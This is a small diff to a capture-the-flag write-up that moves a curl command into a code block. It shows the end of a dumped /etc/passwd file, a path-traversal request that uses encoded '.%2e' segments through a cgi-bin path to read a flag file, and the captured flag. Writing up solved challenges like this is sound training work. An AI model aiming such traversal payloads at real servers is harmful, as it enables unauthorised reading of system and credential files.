@@ -66,6 +66,10 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 ```
 
-We then tested common CTF flag locations and found it at: `curl --path-as-is "http://ctf-18.security.cs.pub.ro:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt"`
+We then tested common CTF flag locations and found it at: 
+
+```
+curl --path-as-is "http://ctf-18.security.cs.pub.ro:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt"
+```
 
 Flag: **SSS{p4th_tr4v3rs4l_3v3rywh3r3}**
